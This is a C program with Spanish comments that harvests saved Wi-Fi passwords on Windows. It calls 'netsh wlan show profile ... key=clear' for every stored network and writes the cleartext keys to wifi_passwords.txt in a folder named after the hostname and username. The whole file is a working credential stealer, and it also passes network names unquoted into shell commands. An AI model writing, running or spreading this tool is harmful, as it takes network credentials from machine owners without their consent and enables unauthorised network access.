#include <stdio.h>
#include <stdlib.h>
#include <string.h>

typedef struct{
    char d[500];
} Directorio;

Directorio crearCarpetaUsuario(){
    FILE *salidaComando = popen("hostname && echo %username%","r"); //Dos líneas: nombre disposito y nombre usuario
    if(salidaComando == NULL) {
        printf("Error en la apertura del fichero del comando");
        exit(1);
    }

    Directorio directorio;
    //Nombre dispositivo
    fgets(directorio.d, 500, salidaComando);
    strtok(directorio.d, "\n");
    //Nombre usuario
    char nombre_usuario[255];
    fgets(nombre_usuario, 255, salidaComando);
    strtok(nombre_usuario, " \n");
    strcat(directorio.d, " ");//Unir el nombre de dispositivo al nombre de usuario
    strcat(directorio.d,nombre_usuario);

    //Crear directorio
    strcpy(nombre_usuario, "mkdir \"");
    strcat(nombre_usuario, directorio.d);
    strcat(nombre_usuario, "\" > nul 2>&1"); //Añade una comilla y el resto es para ocultar el mensaje en el cmd en caso de que ya exista el directorio
    system(nombre_usuario); //mkdir "dispositivo usuario"

    fclose(salidaComando);
    return directorio;
}


int main(int argc, char** argv)
{
    //CREAR Y OBTENER EL DIRECTORIO DONDE SE VAN A GUARDAR LOS DATOS
    Directorio directorioDondeGuardar = crearCarpetaUsuario();
    if(&directorioDondeGuardar==NULL){ //Creación de una carpeta para los datos del usuario
        printf("Error en creación de la carpeta para los datos del usuario");
        exit(1);
    }
    strcat(directorioDondeGuardar.d, "\\wifi_passwords.txt");

    //CREAR Y ABRIR EL FICHERO DONDE SE VAN A ALMACENAR LOS DATOS
    char comando[750] = "echo **************** %date% -%time% *************** >> \"";
    strcat(comando,directorioDondeGuardar.d);
    strcat(comando,"\"");
    system(comando); //Añadir la cabecera del contenido con la fecha y hora a la que se añade
    //Apertura fichero salida
    FILE *salida;
    salida  = fopen(directorioDondeGuardar.d,"a");
    if(salida == NULL)
    {
        printf("Error en la apertura del fichero de salida");
        exit(2);
    }

    //EXTRACCIÓN Y GUARDADO DE LAS CONTRASEÑAS
    FILE *salidaComando = popen("netsh wlan show profile","r");
    if(salidaComando == NULL) {
        printf("Error en la búsqueda de las redes");
        fclose(salida);
        exit(3);
    }
    char nombreRed[255];
    fgets(nombreRed, 255, salidaComando); //Pasar hasta la lista de redes
    fgets(nombreRed, 255, salidaComando);
    fgets(nombreRed, 255, salidaComando);
    fgets(nombreRed, 255, salidaComando);
    fgets(nombreRed, 255, salidaComando);
    fgets(nombreRed, 255, salidaComando);
    fgets(nombreRed, 255, salidaComando);
    fgets(nombreRed, 255, salidaComando);
    fgets(nombreRed, 255, salidaComando);

    //Lectura passwords
    char password[255];
    fgets(nombreRed, 255, salidaComando);
    while(strcmp(nombreRed,"\n")!=0){
        memcpy(nombreRed, nombreRed+39,sizeof(nombreRed));
        strtok(nombreRed, " \n");

        //Crear comando de consulta de la clave una vez se tiene el nombre de la red
        strcpy(comando, "netsh wlan show profile name=");
        strcat(comando, nombreRed);
        strcat(comando, " key=clear");

        //Introducir comando
        FILE *salidaComandoPassword = popen(comando,"r");
        if(salidaComandoPassword == NULL) {
            printf("Error en la búsqueda de las contraseñas");
            fclose(salida);
            fclose(salidaComando);
            exit(4);
        }

        //Limpieza del resultado del comando para obtener solo la clave
        int i = 0;
        do { //Obtener línea que contiene la clave
            fgets(password, 255, salidaComandoPassword);
            strncpy(comando, password, 28); comando[28]='\0'; //Para comparar la primera parte de la línea obtenida "    Contenido de la clave  :"
        } while(strcmp(comando,"    Contenido de la clave  :")!=0 && strcmp(comando,"    Origen de costo         ")!=0);

        if(strcmp(comando,"    Contenido de la clave  :")==0) { //Si la red tiene clave, porque puede ser de las de iniciar sesión
            memcpy(password, password+29,sizeof(password)); //Quedarse solo con la clave
            strcpy(comando, nombreRed); //Poner red:password
            strcat(comando, " = ");
            strcat(comando, password);
            fputs(comando, salida);
        }

        fclose(salidaComandoPassword);
        fgets(nombreRed, 255, salidaComando);
    }

    //Cerrar fichero salida y añadir saltos de línea al final
    fclose(salida);
    strcpy(comando, "echo.>>\"");
    strcat(comando, directorioDondeGuardar.d);
    strcat(comando, "\"");
    system(comando); //Añadir un salto de línea

    return 0;
}

